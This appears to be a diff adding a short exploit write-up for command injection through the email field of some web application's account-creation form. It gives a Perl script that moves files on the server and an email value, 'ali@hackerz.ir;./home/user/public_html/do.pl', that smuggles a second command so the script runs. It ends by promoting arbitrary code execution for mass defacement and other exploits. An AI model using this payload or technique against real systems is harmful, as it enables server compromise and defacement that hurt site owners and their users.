@@ -1,0 +1,24 @@
+Test it:
+++++++++++++++++++++++++++
+Step 1
+
+Save this file in /home/user/public_html/do.pl .
+#!/usr/bin/perl
+$old='/home/user/public_html/test.txt';
+$new='/home/root/kon.txt';
+rename $old, $new;
+++++++++++++++++++++++++++
+step 2
+
+make a text file named test.txt in your public_html directory.
+path will be : /home/user/public_html/test.txt .
+++++++++++++++++++++++++++
+step 3
+
+create an account and write ali@hackerz.ir;./home/user/public_html/do.pl in E-mail Address text box
+then click on the "create" button.
+Yes , you can find your file in /home/root/ .
+++++++++++++++++++++++++++
+()()()()()()()()()()()()()
+you can run your own code !(mass defacer, exploit's or everything that u want).
+Enjoy it...
